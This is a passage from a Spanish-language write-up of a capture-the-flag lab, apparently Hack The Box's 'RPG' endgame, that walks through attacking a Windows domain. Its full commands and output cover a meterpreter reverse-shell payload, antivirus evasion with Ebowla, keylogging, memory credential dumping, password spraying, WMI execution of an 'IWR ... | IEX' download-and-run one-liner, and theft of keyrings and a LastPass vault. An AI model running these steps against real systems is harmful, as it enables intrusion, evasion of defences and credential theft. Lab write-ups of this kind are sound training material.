+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lport 4444
+lport => 4444
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:4444</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que no tenemos conexion directa con nuestro equipo usaremos la maquina ignis para redirigir el trafico del puerto <code class="language-plaintext highlighter-rouge">4444</code> local al puerto <code class="language-plaintext highlighter-rouge">4444</code> de nuestro equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:9999  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ ./chisel client 10.10.14.10:9999 0.0.0.0:4444:10.10.14.10:4444 &
+client: Connecting to ws://10.10.14.10:9999
+client: tun: proxy#4444=>10.10.14.10:4444: Listening
+</span><span class="ve">beta_user@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora crearemos un <code class="language-plaintext highlighter-rouge">exe</code> malicioso que nos envie la sesion pero indicaremos la <code class="language-plaintext highlighter-rouge">ip</code> de la maquina ignis que redirige el puerto que es la direccion <code class="language-plaintext highlighter-rouge">192.168.125.135</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.125.135 LPORT=4444 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos otro problema y es que si subimos el <code class="language-plaintext highlighter-rouge">exe</code> malicioso automaticamente el <code class="language-plaintext highlighter-rouge">antivirus</code> lo detecta como amenaza y borra todo su contenido, lo deja con <code class="language-plaintext highlighter-rouge">0</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">upload </span><span class="p">shell.exe
+</span><span class="az">
+Info: Uploading shell.exe to C:\Users\janderson\Documents\shell.exe  
+</span><span class="sa">
+Data: 9556 bytes of 9556 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\janderson\Documents> </span><span class="am">dir </span><span class="p">
+
+    Directory: C:\Users\janderson\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/29/2023   8:25 PM              0 shell.exe
+
+PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para evitar esto podemos usar <a href="https://github.com/Genetic-Malware/Ebowla">ebowla</a> para ofuscar un poco nuestro exe malicioso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">ebowla.py shell.exe genetic.config
+[*] Using Symmetric encryption
+[*] Payload length 7168
+[*] Payload_type exe
+[*] Using EXE payload template
+[*] Used environment variables:
+	[-] environment value used: username, value used: lux
+[!] Path string not used as part of key
+[!] External IP mask NOT used as part of key
+[!] System time mask NOT used as part of key
+[*] String used to source the encryption key: lux
+[*] Applying 10000 sha512 hash iterations before encryption
+[*] Encryption key is: d7f740196206d2a46b638ccc3aecceb1d47326d06a1870f9b9fe98f20ca2155b  
+[*] Writing Python payload to: go_symmetric_shell.exe.go
+[*] Removing Comments and Print Statements
+
+</span><span class="ve">❯ ./build_x64_go.sh </span><span class="p">output/go_symmetric_shell.exe.go shell_ofs.exe
+[*] Copy Files to tmp for building
+[*] Building...
+[*] Building complete
+[*] Copy shell_ofs.exe to output
+[*] Cleaning up
+[*] Done</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Subimos el exe que nos creo <code class="language-plaintext highlighter-rouge">ebowla</code> y al ejecutarlo envia la sesion sin problemas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">.\shell_ofs.exe  
+</span><span class="p">PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo recibimos una sesión de <code class="language-plaintext highlighter-rouge">meterpreter</code> como el usuario <code class="language-plaintext highlighter-rouge">janderson</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:4444 
+</span><span class="az">[*] </span><span class="p">Sending stage (200774 bytes) to 10.10.14.10
+</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.14.10:49722)  
+
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Users\janderson\Documents) > getuid
+Server username: ROUNDSOFT\janderson
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Users\janderson\Documents) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Igual que antes migraremos al proceso <code class="language-plaintext highlighter-rouge">RuntimeBroker</code> e iniciaremos un <code class="language-plaintext highlighter-rouge">keylogger</code>, sin embargo desde <code class="language-plaintext highlighter-rouge">meterpreter</code> es mucho mas facil hacer todo este proceso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Users\janderson\Documents) > migrate -N RuntimeBroker.exe  
+</span><span class="az">[*] </span><span class="p">Migrating from 15276 to 5804...
+</span><span class="az">[*] </span><span class="p">Migration completed successfully.
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > keyscan_start 
+Starting the keystroke sniffer ...
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de unos segundo que se reinicia la sesion de <code class="language-plaintext highlighter-rouge">putty</code> podemos capturar las pulsaciones ingresadas por el usuario y por lo tanto la <code class="language-plaintext highlighter-rouge">contraseña</code> para ssh</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > keyscan_dump  
+Dumping captured keystrokes...
+(03^69<@BHM*/KY4z&ltCR>
+
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) ></span>
+</code></pre></div></div><br>
+<p class="plain-text">Podemos conectarnos como <code class="language-plaintext highlighter-rouge">root</code> con esta contraseña a traves de <code class="language-plaintext highlighter-rouge">ssh</code> y leer la flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">root@10.13.38.18 
+root@10.13.38.18's password: (03^69<@BHM*/KY4z
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I 
+10.13.38.18 192.168.125.135 172.17.0.1 dead:beef::250:56ff:fe07:4590  
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># cat flag.txt 
+RPG{h1j@ckin_lyk_@_pir@t3}
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag3">
+<br><h3 class="post-title">One's act, one's profit</h3>
+<h4 class="post-title">RPG{n0thing_1s_h1dd3n_fr0m_r00t!}</h4><br>
+
+<p class="plain-text">Ya como root podemos ver procesos de <code class="language-plaintext highlighter-rouge">gnome</code> ejecutandose como <code class="language-plaintext highlighter-rouge">ruby</code>, espeficicamente nos interesa el proceso que ejecuta <code class="language-plaintext highlighter-rouge">gnome-keyring-daemon</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># ps aux | grep ruby
+</span><span class="ro">ruby       </span><span class="p">1536  0.0  0.2  77032  8168 ?        Ss   00:05   0:00 /lib/systemd/systemd --user
+</span><span class="ro">ruby       </span><span class="p">1545  0.0  0.0 114104  2656 ?        S    00:05   0:00 (sd-pam)
+</span><span class="ro">ruby       </span><span class="p">1579  0.0  0.2 279984 11880 ?        SLl  00:05   0:00 /usr/bin/gnome-keyring-daemon --daemonize --login
+</span><span class="ro">ruby       </span><span class="p">1596  0.0  0.1 203736  5932 tty1     Ssl+ 00:05   0:00 /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
+</span><span class="ro">ruby       </span><span class="p">1598  0.0  4.0 622364 161732 tty1    Sl+  00:05   0:02 /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/1001/gdm/Xauthority -background none -noreset -keeptty -verbose 3  
+</span><span class="ro">ruby       </span><span class="p">1617  0.0  0.1  52480  6456 ?        Ss   00:05   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+</span><span class="ro">ruby       </span><span class="p">1624  0.0  0.3 698280 13916 tty1     Sl+  00:05   0:00 /usr/lib/gnome-session/gnome-session-binary --session=ubuntu
+</span><span class="ro">ruby       </span><span class="p">1896  0.0  0.0  11304   320 ?        Ss   00:05   0:00 /usr/bin/ssh-agent /usr/bin/im-launch env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
+</span><span class="ro">ruby       </span><span class="p">2008  0.0  0.1 349292  6476 ?        Ssl  00:05   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
+</span><span class="ro">ruby       </span><span class="p">2036  0.0  0.0  49924  3560 ?        S    00:05   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
+</span><span class="ro">ruby       </span><span class="p">2065  0.0  0.1 220780  6564 ?        Sl   00:06   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
+</span><span class="ro">ruby       </span><span class="p">2218  0.0  0.3 279696 12448 ?        Sl   00:06   0:00 /usr/bin/gnome-keyring-daemon --start --foreground --components=secrets
+</span><span class="ro">ruby       </span><span class="p">2377  0.0  4.1 3240876 168612 tty1   Sl+  00:06   0:49 /usr/bin/gnome-shell
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a> podemos buscar credenciales sin cifrar en la memoria, vemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">ruby</code> en texto plano la cual podemos usar para <code class="language-plaintext highlighter-rouge">ssh</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># python3 mimipenguin.py 
+[SYSTEM - GNOME]	ruby:N1xp@ssw0rd4Ruby  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">ruby@10.13.38.18
+ruby@10.13.38.18's password: N1xp@ssw0rd4Ruby
+</span><span class="ve">ruby@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
+</span><span class="ve">ruby@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+10.13.38.18 192.168.125.135 172.17.0.1 dead:beef::250:56ff:fe07:4590  
+</span><span class="ve">ruby@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Habiamos visto un proceso de <code class="language-plaintext highlighter-rouge">keyrings</code>, en el directorio donde se guardan los keyrings encontramos <code class="language-plaintext highlighter-rouge">4</code> archivos que son Credentials, login, stuff y user</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">ruby@Ignis</span><span class="p">:</span><span class="az">~/.local/share/keyrings</span><span class="p">$ ls -l
+-rw------- 1 ruby ruby 677 Jan 17  2020 Credentials.keyring  
+-rw------- 1 ruby ruby 535 Jan 17  2020 login.keyring
+-rw------- 1 ruby ruby 315 Jan 17  2020 stuff.keyring
+-rw------- 1 ruby ruby 207 Jan 17  2020 user.keystore
+</span><span class="ve">ruby@Ignis</span><span class="p">:</span><span class="az">~/.local/share/keyrings</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aprovechando la conexion ssh con <code class="language-plaintext highlighter-rouge">scp</code> podemos transferir todos los <code class="language-plaintext highlighter-rouge">keyrings</code> del usuario ruby a nuestro directorio de keyrings para despues abrirlos con <code class="language-plaintext highlighter-rouge">seahorse</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ scp </span><span class="p">ruby@10.13.38.18:</span><span class="am">'~/.local/share/keyrings/*' </span><span class="p">~/.local/share/keyrings  
+ruby@10.13.38.18's password: N1xp@ssw0rd4Ruby
+
+</span><span class="ve">❯ seahorse</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el keyring <code class="language-plaintext highlighter-rouge">stuff</code> usando la contraseña de ruby podemos decifrar su contenido, su descripción es <code class="language-plaintext highlighter-rouge">Flag</code> y su contraseña simplemente nos muestra la flag</p>
+<a href="/endgames/rpg/19.png" target="_blank"><div><p><img src="/endgames/rpg/19.png"></p></div></a>
+
+</section>
+
+<section class="post" id="flag4">
+<br><h3 class="post-title">The source of power</h3>
+<h4 class="post-title">RPG{L3v31iNg_uP_2_t3h_b0$$_m0d3}</h4><br>
+
+<p class="plain-text">En el keyring <code class="language-plaintext highlighter-rouge">Credentials</code> encontramos <code class="language-plaintext highlighter-rouge">3</code> credenciales existentes, cada una con diferentes <code class="language-plaintext highlighter-rouge">contraseñas</code> para diferentes servicios como Drive, Wifi y Workstation</p>
+<a href="/endgames/rpg/20.png" target="_blank"><div><p><img src="/endgames/rpg/20.png"></p></div></a>
+
+<p class="plain-text">Despues de crear una lista de los <code class="language-plaintext highlighter-rouge">usuarios</code> del dominio probamos autenticarnos a traves de <code class="language-plaintext highlighter-rouge">smb</code> usando esta contraseña, esta es valida para el usuario <code class="language-plaintext highlighter-rouge">rrodriguez</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u users.txt -p I@mabArb13g1rl1n@barbi3w0rld
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\administrator:I@mabArb13g1rl1n@barbi3w0rld STATUS_ACCOUNT_RESTRICTION 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\Guest:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\krbtgt:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\DefaultAccount:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\nyoshida:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\hsakaguchi:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\yamano:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\tnomura:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\htanaka:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\repository_admin:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\rrodriguez:I@mabArb13g1rl1n@barbi3w0rld</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos probar las credenciales para el protocolo <code class="language-plaintext highlighter-rouge">winrm</code> hacia todos los equipos del dominio, todos devuelven error excepto el host <code class="language-plaintext highlighter-rouge">.129</code> que devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm 192.168.125.88-129 -u rrodriguez -p I@mabArb13g1rl1n@barbi3w0rld
+</span><span class="az">SMB         </span><span class="p">192.168.125.88  5985   GELUS            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:GELUS) (domain:Roundsoft.local)
+</span><span class="az">SMB         </span><span class="p">192.168.125.128 5985   SHINRA           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 (name:SHINRA) (domain:Roundsoft.local)  
+</span><span class="az">SMB         </span><span class="p">192.168.125.129 5985   LUX              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 18362 (name:LUX) (domain:Roundsoft.local)
+</span><span class="az">HTTP        </span><span class="p">192.168.125.88  5985   GELUS            </span><span class="az">[*] </span><span class="p">http://192.168.125.88:5985/wsman
+</span><span class="az">HTTP        </span><span class="p">192.168.125.128 5985   SHINRA           </span><span class="az">[*] </span><span class="p">http://192.168.125.128:5985/wsman
+</span><span class="az">HTTP        </span><span class="p">192.168.125.129 5985   LUX              </span><span class="az">[*] </span><span class="p">http://192.168.125.129:5985/wsman
+</span><span class="az">HTTP        </span><span class="p">192.168.125.88  5985   GELUS            </span><span class="ro">[-] </span><span class="p">Roundsoft.local\rrodriguez:I@mabArb13g1rl1n@barbi3w0rld 
+</span><span class="az">HTTP        </span><span class="p">192.168.125.128 5985   SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\rrodriguez:I@mabArb13g1rl1n@barbi3w0rld 
+</span><span class="az">HTTP        </span><span class="p">192.168.125.129 5985   LUX              </span><span class="ve">[+] </span><span class="p">Roundsoft.local\rrodriguez:I@mabArb13g1rl1n@barbi3w0rld </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos conectamos haciendo uso de <code class="language-plaintext highlighter-rouge">evil-winrm</code> al equipo <code class="language-plaintext highlighter-rouge">LUX</code> donde la credencial es validas y obtenemos una powershell como el usuario <code class="language-plaintext highlighter-rouge">rrodriguez</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i lux.roundsoft.local -u rrodriguez -p I@mabArb13g1rl1n@barbi3w0rld  
+PS C:\Users\rrodriguez\Documents> </span><span class="am">whoami</span><span class="p">
+roundsoft\rrodriguez
+PS C:\Users\rrodriguez\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El usuario tiene acceso a <code class="language-plaintext highlighter-rouge">WmiMonitor</code> por lo que podemos pensar que puede hacer cosas con el como obtener acceso remoto a otro <code class="language-plaintext highlighter-rouge">equipo</code> que sea parte del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Program Files (x86)\SolarWinds> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Program Files (x86)\SolarWinds
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/15/2019   4:34 PM                WmiMonitor  
+
+PS C:\Program Files (x86)\SolarWinds></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al definir las credenciales del usuario <code class="language-plaintext highlighter-rouge">rrodriguez</code> e invocar un comando mediante <code class="language-plaintext highlighter-rouge">WMI</code> hacia el equipo <code class="language-plaintext highlighter-rouge">GELUS</code> parece que se ejecuta sin denegarnos el acceso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\rrodriguez\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'I@mabArb13g1rl1n@barbi3w0rld' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\rrodriguez\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'roundsoft.local\rrodriguez'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)
+PS C:\Users\rrodriguez\Documents> </span><span class="am">Invoke-WmiMethod </span><span class="c1">-ComputerName </span><span class="p">GELUS </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Path </span><span class="p">win32_process </span><span class="c1">-Name </span><span class="p">Create </span><span class="c1">-ArgumentList </span><span class="p">(</span><span class="az">'whoami'</span><span class="p">)  
+
+__GENUS          : 2
+__CLASS          : __PARAMETERS
+__SUPERCLASS     :
+__DYNASTY        : __PARAMETERS
+__RELPATH        :
+__PROPERTY_COUNT : 2
+__DERIVATION     : {}
+__SERVER         :
+__NAMESPACE      :
+__PATH           :
+ProcessId        : 8136
+ReturnValue      : 0
+PSComputerName   :
+
+PS C:\Users\rrodriguez\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El equipo <code class="language-plaintext highlighter-rouge">GELUS</code> si tiene conexion directa con nosotros, asi que podemos aprovechar el script <code class="language-plaintext highlighter-rouge">pocat.ps1</code> de antes para abrir un listener en el puerto <code class="language-plaintext highlighter-rouge">4444</code> con una powershell, para ello hacemos la peticion con <code class="language-plaintext highlighter-rouge">IWR</code> y la interpretamos con <code class="language-plaintext highlighter-rouge">IEX</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\rrodriguez\Documents> </span><span class="am">Invoke-WmiMethod </span><span class="c1">-ComputerName </span><span class="p">GELUS </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Path </span><span class="p">win32_process </span><span class="c1">-Name </span><span class="p">Create </span><span class="c1">-ArgumentList </span><span class="p">(</span><span class="az">'powershell -c "IWR 10.10.14.10/pocat.ps1 | IEX"'</span><span class="p">)  
+PS C:\Users\rrodriguez\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
+10.13.38.19 - - "GET /pocat.ps1 HTTP/1.1" 200 -</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de interpretarse nos podemos conectar el puerto <code class="language-plaintext highlighter-rouge">4444</code> y obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code> como el usuario <code class="language-plaintext highlighter-rouge">rrodriguez</code> pero esta vez en el equipo <code class="language-plaintext highlighter-rouge">GELUS</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat </span><span class="p">gelus.roundsoft.local 4444
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+roundsoft\rrodriguez
+PS C:\Windows\system32> </span><span class="am">hostname</span><span class="p">
+GELUS
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">Downloads</code> de rrodriguez encontramos un exe de <code class="language-plaintext highlighter-rouge">ChromeSetup</code> que se usa para instalar <code class="language-plaintext highlighter-rouge">chrome</code> por lo que podemos suponer que este esta instalado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\rrodriguez\Downloads> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\rrodriguez\Downloads
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/19/2020   8:33 PM        1397976 ChromeSetup.exe  
+
+PS C:\Users\rrodriguez\Downloads></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Navegando entre archivos encontramos un archivo llamado <code class="language-plaintext highlighter-rouge">1</code> de una extension la cual buscando el nombre de la carpeta nos encontramos con que es <code class="language-plaintext highlighter-rouge">LastPass</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\rrodriguez\Downloads> </span><span class="am">dir </span><span class="az">'C:\Users\rrodriguez\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0'</span><span class="p">  
+
+    Directory: C:\Users\rrodriguez\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/19/2020   9:01 PM          77824 1
+
+PS C:\Users\rrodriguez\Downloads></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para descargarlo podemos copiarlo a un servidor <code class="language-plaintext highlighter-rouge">smb</code> creado en nuestro equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\rrodriguez\Downloads> </span><span class="am">cp </span><span class="az">'C:\Users\rrodriguez\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0\1' </span><span class="p">\\10.10.14.10\kali\1  
+PS C:\Users\rrodriguez\Downloads></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar una <a href="https://github.com/cfbao/lastpass-vault-parser">herramienta</a> para decifrarlo, despues de probar contraseñas nos funciona una de las contraseñas que encontramos antes en los <code class="language-plaintext highlighter-rouge">keyrings</code>, como resultado en la data que nos genera obtenemos la <code class="language-plaintext highlighter-rouge">flag</code> ademas de credenciales</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">lpparser.py
+Path of LastPass vault file: 1
+Output directory: .
+Email: ruby@roundsoft.com
+Password: L1f3_1s_pl@st1c
+
+Data exported to /home/kali/lastpass-vault-parser
+
+press ENTER to exit
+
+</span><span class="ve">❯ cat </span><span class="p">Sites_and_SecureNotes.csv     
+"aid","Name","Folder","URL","Notes","Favorite","sharedfromaid","Username","Password","Require Password Repromt","Generated Password","Secure Notes","Last Used","AutoLogin","Disable AutoFill","realm_data","fiid","custom_js","submit_id","captcha_id","urid","basic_auth","method","action","groupid","deleted","attachkey","attachpresent","individualshare","Note Type","noalert","Last Modified","Shared with Others","Last Password Changed","Created","vulnerable","Auto Change Password supported","breached","Custom Template","Form Fields"  
+"738847209304266833","Admin account - Mail","mail","http://mail.roundsoft.local/owa","","0","","ruby_adm","b3aut1fu1_lyk_@_g3m!","0","0","0","0","0","0","","738847209304266833","","","","0","0","","","0","0","","","0","","","1579534224","0","1579534224","1579534224","","0","0","",""
+"8006682195168702159","Flag","flag","http://sn","RPG{L3v31iNg_uP_2_t3h_b0$$_m0d3}","0","","","","0","0","1","0","0","0","","8006682195168702159","","","","0","0","","","1","","","","0","Generic","","","","","","","0","0","",""</span>
+</code></pre></div></div><br>
+
+
+</section>
+
+<section class="post" id="flag5">
+<br><h3 class="post-title">Wake from death and turn to life</h3>
